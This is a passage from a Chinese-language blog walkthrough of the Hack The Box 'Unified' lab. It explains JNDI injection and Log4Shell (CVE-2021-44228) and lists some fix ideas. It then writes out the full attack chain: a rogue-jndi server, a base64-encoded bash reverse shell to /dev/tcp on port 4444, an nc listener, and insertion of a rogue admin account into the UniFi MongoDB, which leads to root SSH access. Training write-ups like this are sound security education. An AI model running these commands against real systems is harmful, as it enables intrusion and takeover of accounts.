+<p><strong>当有客户端通过lookup(“refObj”)获取远程对象时，获取的是一个Reference存根（Stub)，由于是Reference的存根，所以客户端会先在本地的classpath中去检查是否存在类refClassName，如果不存在则去指定的url（</strong><a href="http://ip:port/refClassName.class"><strong>http://ip:port/refClassName.class</strong></a><strong>）动态加载，<strong><strong>并且调用insClassName的无参构造函数</strong></strong>，所以可以在构造函数里写恶意代码。当然除了在无参构造函数中写利用代码，还可以利用java的static代码块来写恶意代码，因为**<strong>static代码块的代码在class文件被加载过后就会立即执行，且只执行一次</strong></strong>。**</p>
+<p><strong>听起来有点绕，其实这个上面也提到过（总结2、3）</strong></p>
+<p><strong>流程：</strong></p>
+<p><img src="/images/WEBRESOURCEcb912d42799c46a1a8c835cb80502603a65fa9d6322d4f4781fe1f0e61d82374.png"></p>
+<p><strong>2、Log4j2 rce原理</strong></p>
+<p><strong>首先log4j打印日志有四个级别：debug、info、warn、error，不管哪个方法打印日志，在正常的log处理过程中，对${这两个紧邻的字符做了检测，一旦遇到类似表达式结构的字符串就会触发替换机制。</strong></p>
+<p><strong>一旦在log字符串中检测到${}，就会解析其中的字符串尝试使用lookup查询，因此只要能控制log参数内容，就有机会实现漏洞利用。</strong></p>
+<p><img src="/images/WEBRESOURCE6479c49c4167638a0b81cc232a219e52996f08e06db84e94a625e7e234589ada.png"></p>
+<p><strong>所以最终还是会去调用JNDI的lookup方法，所以知道JNDI的注入原理就很好理解这次漏洞形成的原因了</strong></p>
+<p><strong>Log4j2 rce原理：</strong></p>
+<p><img src="/images/WEBRESOURCE104edd0d5a3808a7931ddaf5a5aa46f21961d0694cd94f83a1237bfacf88daad.png"></p>
+<p>4、修复思路</p>
+<p>1、禁止用户请求参数中出现攻击关键字</p>
+<p>2、禁止lookup下载远程文件（命名引用）</p>
+<p>3、禁止log4j的应用连接外网</p>
+<p>4、禁止log4j使用lookup</p>
+<p>2.15版本修复方法：</p>
+<p>修复后log4j2在jndi lookup中增加了很多限制：</p>
+<p>默认不再支持二次跳转（命名引用）的方式获取对象</p>
+<p>只有在log4j2.allowedLdapClasses列表中指定的class才能获取</p>
+<p>只有远程地址是本地或者在log4j2.allowedLdapHosts列表中指定的地址才能获取</p>
+<h1 id="Task-9"><a href="#Task-9" class="headerlink" title="Task 9"></a><strong>Task 9</strong></h1><p><strong>What port is the MongoDB service running on?</strong></p>
+<p><strong>此后所有的题目都是基于需要拿到目标的shell,而拿到shell的方法是利用CVE漏洞CVE-2021-44228，拿到shell以后，以下为拿到shell的过程：</strong></p>
+<p><strong>通过log4j漏洞拿到shell需要借助以下脚本：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/veracode-research/rogue-jndi"><strong>https://github.com/veracode-research/rogue-jndi</strong></a></p>
+<p>我们通过以下命令安装脚本并构建好服务器</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/veracode-research/rogue-jndi</span><br><span class="line">cd rogue-jndi </span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure>
+
+<p><strong>mvn要安装maven</strong></p>
+<p>Maven是一个跨平台的项目管理工具。作为Apache组织的一个颇为成功的开源项目，其主要服务于基于Java平台的项目创建，依赖管理和项目信息管理。maven是Apache的顶级项目，解释为“专家，内行”，它是一个项目管理的工具，maven自身是纯java开发的，可以使用maven对java项目进行构建、依赖管理。</p>
+<p><strong>出现以下界面说明构建完</strong></p>
+<p><img src="/images/WEBRESOURCE5e172cae9eefbbe09202a6807c7a5e7b6499b2e9efd74892b871f1ebff3297a4.png"></p>
+<p><strong>接着在命令行中将获取shell的脚本base64编码，注意替换为自己的ip地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;bash -c bash -i &gt;&amp;/dev/tcp/10.10.14.53/4444 0&gt;&amp;1&#x27; | base64</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE95c2744a1d6842fe2f6c348134982e787daa224d117b4744969cf145cc9ef21e.png"></p>
+<p><strong>接着使用java将前面生成的base64填入下面的命令，同时记得更换为自己的地址</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar target/RogueJndi-1.1.jar --command &quot;bash -c &#123;echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuNTMvNDQ0NCAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; --hostname &quot;10.10.14.53&quot;</span><br></pre></td></tr></table></figure>
+
+<p><strong>出现如下界面表示运行成功</strong></p>
+<p><img src="/images/WEBRESOURCEfaddee9a91e068a56bf3b5654fa308ff38bbe1fc77f24dbb9404304d48080c88.png"></p>
+<p><strong>本地监听一下4444端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>在burpsuite中重新发送一次，注意发送的请求，其中remember中的ip应该是自己的ip，我这个地方又变了是因为我又重新启动了靶机。</strong></p>
+<p><img src="/images/WEBRESOURCEca5db900d203e2ce70620bcc2fd24bfa355680e286bc43a5bd68647a21271ceb.png"></p>
+<p><strong>此时nc中会拿到目标机器的shell，而且用户是unif，以上步骤的整体操作如下：</strong></p>
+<p><img src="/images/WEBRESOURCE5a2cdfe543a0f98a863aed587f7cbdb590e608478a3c45e0b48570611cf4c0cd.png"></p>
+<p><strong>接着升级为交互式shell，以方便的进行下一步</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script /dev/null -c bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE50c0a68bf495340ff0c093b751b59ee2234802d8684646fe8630d8606f245cd2.png"></p>
+<p>**回到刚刚那个问题：**mongodb跑在哪个端口上？	27117</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps aux | grep mongo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE1f3c34222c8060cb5398d6320ac36b361a4df4f5e6d44f298e0e5de568536e13.png"></p>
+<h1 id="TASK-10"><a href="#TASK-10" class="headerlink" title="TASK 10"></a>TASK 10</h1><p>unifi的默认数据库名是什么？</p>
+<p>答案：ace</p>
+<p>知道了用户名后，我们可以通过终端连接进数据库</p>
+<p><em>MongoDB 是一个基于分布式文件存储的数据库。由 C++ 语言编写。旨在为 WEB 应用提供可扩展的高性能数据存储解决方案。</em></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongo --port  27117 ace</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCEd3b8119b20341dff3b5dbadee87d96852132f56ed61b488482ae399ca660739a.png"></p>
+<h1 id="TASK11"><a href="#TASK11" class="headerlink" title="TASK11"></a><strong>TASK11</strong></h1><p><strong>枚举数据库的所有用户的函数是什么？</strong></p>
+<p><strong>db.admin.find()</strong></p>
+<p><strong>执行结果如下</strong></p>
+<p><img src="/images/WEBRESOURCEc1b453d6773165523e4c8e166b58e7e7df41275b83e94108be513600d4df5828.png"></p>
+<h1 id="TASK-12"><a href="#TASK-12" class="headerlink" title="TASK 12"></a>TASK 12</h1><p><img src="/images/WEBRESOURCE5406d3029357078382db928588ed85290361170713db4c89843ee60997330456.png"></p>
+<p><strong>问：mongodb中增加数据的函数是什么？</strong></p>
+<p><strong>回答：db.admin.insert()</strong></p>
+<h1 id="TASK-13"><a href="#TASK-13" class="headerlink" title="TASK 13"></a><strong>TASK 13</strong></h1><p><img src="/images/WEBRESOURCE83386ffca58f832bf49e8d33fb0008dc259cf42ae7b640ccaf113fb3ee61d093.png"></p>
+<p><strong>问：mongodb中更新数据的函数是什么？</strong></p>
+<p><strong>回答：db.admin.update()</strong></p>
+<p><strong>经过上面两个题目，我们大概能猜出来后面的思路是更新最高权限用户的密码，然后进到unifi的后台看看。</strong></p>
+<p><strong>在添加用户之前，我们先要生成自己的密码，使用以下命令生成，记得最后是密码，自己更换为自己的。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkpasswd -m sha-512 pilgrim</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCEe1d7b824f01b11b178c896606367b716f5ec9c649b0c48ee9584104d3da1701d.png"></p>
+<p><strong>然后我们把密码以及用户名插入进去</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.admin.insert(&#123; &quot;email&quot; : &quot;pilgrim@localhost.local&quot;, &quot;last_site_name&quot; : &quot;default&quot;, &quot;name&quot; : &quot;unifi-admin&quot;, &quot;time_created&quot; : NumberLong(100019800), &quot;x_shadow&quot; : &quot;$6$tVIuEdsp/Y4m8DBy$Dw6.glWpTSPKyxICzmNy.sSrJ9.EXzTsWbK8mKHd8z5njxPwZOi9pcGYgIjI0Ee./JFnES17WMLGexOiABG6m0&quot; &#125;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">db.admin.insert(&#123;</span><br><span class="line">  <span class="string">&quot;email&quot;</span>: <span class="string">&quot;pilgrim@localhost.local&quot;</span>,</span><br><span class="line">  <span class="string">&quot;last_site_name&quot;</span>: <span class="string">&quot;default&quot;</span>,</span><br><span class="line">  <span class="string">&quot;name&quot;</span>: <span class="string">&quot;unifi-admin&quot;</span>,</span><br><span class="line">  <span class="string">&quot;time_created&quot;</span>: NumberLong(<span class="number">100019800</span>),</span><br><span class="line">  <span class="string">&quot;x_shadow&quot;</span>: <span class="string">&quot;$6$tVIuEdsp/Y4m8DBy$Dw6.glWpTSPKyxICzmNy.sSrJ9.EXzTsWbK8mKHd8z5njxPwZOi9pcGYgIjI0Ee./JFnES17WMLGexOiABG6m0&quot;</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE6b4bc7cafe274cd2e7fb60930c66a466%E6%88%AA%E5%9B%BE.png"></p>
+<p><strong>执行的结果</strong></p>
+<p><img src="/images/WEBRESOURCE126a671add4bb801b860e37e7d6edc35ee97e90600024abdb80016500ba90c24.png"></p>
+<p><strong>能看出执行成功，接着查找所以用户，然后获取到刚才添加的用户的objectid。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.admin.find().forEach(printjson);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE4fb8cfd383afc7caa0c2b8e4153298df149b1e0b1ddd4c0f8f3ecdebe8afb961.png"></p>
+<p><strong>查看一下网站的用户的详细信息</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.site.find().forEach(printjson);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCEb8b87a80e93b6c2ec514a6e762916ec9a0fe0b4cd37740dc849e2f97dd91ffa9.png"></p>
+<p><strong>将我们插入的用户绑定到这个网站上去，其中的admin_id就是自己添加的用户的id，site_id就是上面获取的id</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.privilege.insert(&#123; &quot;admin_id&quot; : &quot;623f071e1ab0487109299461&quot;, &quot;permissions&quot; : [ ], &quot;role&quot; : &quot;admin&quot;, &quot;site_id&quot; : &quot;61ce269d46e0fb0012d47ec4&quot; &#125;);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/WEBRESOURCE252133bbe3fe9c986b2ce5b795a9aaa2%E6%88%AA%E5%9B%BE.png"></p>
+<p><strong>如下执行结果</strong></p>
+<p><img src="/images/WEBRESOURCE10851ecd2c273b30c3decc63e7601ab2537bbc49292a4dc9a4837de46d87922c.png"></p>
+<p><strong>接着去后台登录的页面登录刚才的账号，记得账户名是unifi-admin，密码是自己设置的密码。</strong></p>
+<p><strong>这个地方要好久好久，等吧，多换几个浏览器试试也行。在setting中能知道root的密码如下：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NotACrackablePassword4U2022</span><br></pre></td></tr></table></figure>
+
+<p><strong>然后ssh登录就行了</strong></p>
+
+    </article>
+    <!-- license -->
+        <div class="license-wrapper">
+            <p>Author：<a href="https://DarkAmP.github.io">DarkAP</a>
+            <p>Link：<a href="https://darkamp.github.io/2023/08/17/unified/">https://darkamp.github.io/2023/08/17/unified/</a>
+            <p>Publish date：<a href="https://darkamp.github.io/2023/08/17/unified/">August 17th 2023, 12:00:00 am</a>
+            <p>Update date：<a href="https://darkamp.github.io/2023/08/17/unified/">September 20th 2025, 4:13:15 pm</a>
+            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2023/08/31/Shocker/" title="HTB-Labs(Shocker)">
+                    <div class="nextTitle">HTB-Labs(Shocker)</div>
+                </a>
+        </li>
+        <li class="previous">
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2023/08/16/Lame/" title="HTB-Labs(Lame)">
+                    <div class="prevTitle">HTB-Labs(Lame)</div>
+                </a>
+        </li>
+    </ul>
+    <!-- comment -->
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+            
+            
+            
+            <!-- utteranc评论 -->
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+            
+            
+            
+        </div>
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    <!-- Mathjax -->
+</main>
+
+                <!-- profile -->
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+        <div class="social">
+                            <a href="mailto:1085668417@qq.com" class="iconfont-archer email" title="email" ></a>
+                <a href="//github.com/DarkAmP" class="iconfont-archer github" target="_blank" title="github"></a>
+                <span class="iconfont-archer wechat" title="wechat">
+                    <img class="profile-qr" src="/assets/example_qr.png" />
+                </span>
+
+        </div>
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    <!-- 不蒜子  -->
+        <div class="busuanzi-container">
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+        </div>
+</footer>
+
+        </div>
+        <!-- toc -->
+            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK1"><span class="toc-number">2.</span> <span class="toc-text">TASK1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK2"><span class="toc-number">3.</span> <span class="toc-text">TASK2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK3"><span class="toc-number">4.</span> <span class="toc-text">TASK3</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK4"><span class="toc-number">5.</span> <span class="toc-text">TASK4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK5"><span class="toc-number">6.</span> <span class="toc-text">TASK5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK6"><span class="toc-number">7.</span> <span class="toc-text">TASK6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK7"><span class="toc-number">8.</span> <span class="toc-text">TASK7</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK8"><span class="toc-number">9.</span> <span class="toc-text">TASK8</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">9.1.</span> <span class="toc-text">原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81JNDI%E3%80%81RMI%E3%80%81LDAP%E3%80%81JNDI%E6%B3%A8%E5%85%A5%EF%BC%9F"><span class="toc-number">9.1.1.</span> <span class="toc-text">1、JNDI、RMI、LDAP、JNDI注入？</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Task-9"><span class="toc-number">10.</span> <span class="toc-text">Task 9</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK-10"><span class="toc-number">11.</span> <span class="toc-text">TASK 10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK11"><span class="toc-number">12.</span> <span class="toc-text">TASK11</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK-12"><span class="toc-number">13.</span> <span class="toc-text">TASK 12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#TASK-13"><span class="toc-number">14.</span> <span class="toc-text">TASK 13</span></a></li></ol>
+            </div>
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 55
+        </div>
+        <!-- search  -->
+    </div>
+    <div class="post-archive">
+            <div class="archive-year"> 2025 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/PowerView/">PowerView</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/PsExec/">PsExec</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/Rubeus/">Rubeus</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/chisel--%E6%9C%AA%E5%AE%8C%E6%88%90/">chisel--未完成</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/rpcclient/">rpcclient</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/secretsdump.py/">secretsdump.py</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/smbclient/">smbclient</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%8D%B7%E5%BD%B1%E5%89%AF%E6%9C%AC/">卷影副本</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%9F%9F%E6%8E%A7%E5%88%B6%E5%99%A8%E5%B8%B8%E8%A7%81%E7%AB%AF%E5%8F%A3/">域控制器常见端口</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%9F%9F%E5%86%85%E6%BC%8F%E6%B4%9E%E5%92%8C%E5%88%A9%E7%94%A8/">域内漏洞和利用</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF/">域渗透思路</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%9F%9F%E5%86%85%E7%BC%A9%E5%86%99/">域内缩写</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%AF%86%E7%A0%81%E5%96%B7%E6%B4%92/">密码喷洒</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">横向移动</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/">委派攻击</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E6%9C%AC%E6%9C%BA%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/">本机端口转发</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span>
+            <a class="archive-post-title" href="/2025/09/20/OSCP/%E7%A5%A8%E6%8D%AE%E6%94%BB%E5%87%BB/">票据攻击</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/09</span>
+            <a class="archive-post-title" href="/2025/03/09/OSCP/LM%20Hash%20%E5%92%8C%20NT%20Hash/">LM Hash 和 NT Hash</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/DCSync%20%E6%94%BB%E5%87%BB/">DCSync 攻击</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/Pass-the-Ticket%20(PTT)%20%E7%9A%84%E5%90%AB%E4%B9%89/">Pass-the-Ticket (PTT) 的含义</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/enum4linux/">enum4linux</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/getST.py/">getST.py</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/LDAP/">LDAP</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/Mimikatz/">Mimikatz</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/ldapsearch/">ldapsearch</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/ligolg-ng/">ligolg-ng</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/08</span>
+            <a class="archive-post-title" href="/2025/03/08/OSCP/kekeo-%E6%9C%AA%E5%AE%8C%E6%88%90/">kekeo-未完成</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/03</span>
+            <a class="archive-post-title" href="/2025/03/03/OSCP/Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B/">Kerberos认证过程</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2025/01/08/OSCP/AD%E7%AE%80%E4%BB%8B%E5%92%8C%E6%9E%9A%E4%B8%BE%20%E8%AF%BE%E6%9C%AC/">AD简介和枚举 课本</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2024 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/31</span>
+            <a class="archive-post-title" href="/2024/12/31/OSCP/NTLM%E5%8D%8F%E8%AE%AE/">NTLM协议</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/10</span>
+            <a class="archive-post-title" href="/2024/11/10/brainfuck/">HTB-Labs(brainfuck)</a>
+        </li>
+                </ul>
+            <div class="archive-year"> 2023 </div>
+            <ul class="year-list">
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span>
+            <a class="archive-post-title" href="/2023/11/04/cronos/">HTB-Labs(cronos)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span>
+            <a class="archive-post-title" href="/2023/10/24/Vulhub/MrRootMD/">HTB-Labs(MrRootMD)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2023/10/18/beep/">HTB-Labs(Beep)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2023/10/18/nibbles/">HTB-Labs(nibblers)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span>
+            <a class="archive-post-title" href="/2023/10/18/nibber/">HTB-Labs(nibber)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/31</span>
+            <a class="archive-post-title" href="/2023/08/31/Shocker/">HTB-Labs(Shocker)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/17</span>
+            <a class="archive-post-title" href="/2023/08/17/unified/">HTB-Labs(unified)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/16</span>
+            <a class="archive-post-title" href="/2023/08/16/Lame/">HTB-Labs(Lame)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/09</span>
+            <a class="archive-post-title" href="/2023/08/09/Vaccine/">HTB-Labs(Vaccine)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span>
+            <a class="archive-post-title" href="/2023/08/03/PWN/%E5%82%A8%E5%AD%98%E5%8D%95%E5%85%83/">二进制存储单元</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span>
+            <a class="archive-post-title" href="/2023/08/03/PWN/%E4%B8%A4%E4%B8%AA%E5%85%B3%E9%94%AE%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8/">两个关键的寄存器</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2023/07/31/PWN/%E6%A0%88%E5%92%8C%E5%A0%86%E7%9A%84%E5%8C%BA%E5%88%AB/">堆和栈的区别</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2023/07/31/PWN/%E6%A0%88%E4%BB%8B%E7%BB%8D/">栈介绍</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2023/07/31/PWN/%E6%A0%88%E5%92%8C%E6%A0%88%E6%93%8D%E4%BD%9C%E7%9A%84%E5%AE%9E%E7%8E%B0/">堆栈操作的实现</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2023/07/31/PWN/%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E5%85%A5%E9%97%A8mov%E5%92%8Cadd/">汇编指令入门mov和add</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/31</span>
+            <a class="archive-post-title" href="/2023/07/31/PWN/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%20%E5%9F%BA%E4%BA%8Ex86%E5%A4%84%E7%90%86%E5%99%A8%20%E7%AC%AC7%E7%89%88%20-%20Nya/">汇编语言 基于x86处理器</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2023/07/28/Archetype/">HTB-Labs(Archetype)</a>
+        </li>
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/28</span>
+            <a class="archive-post-title" href="/2023/07/28/Oopsie/">HTB-Labs(Oopsie)</a>
+        </li>
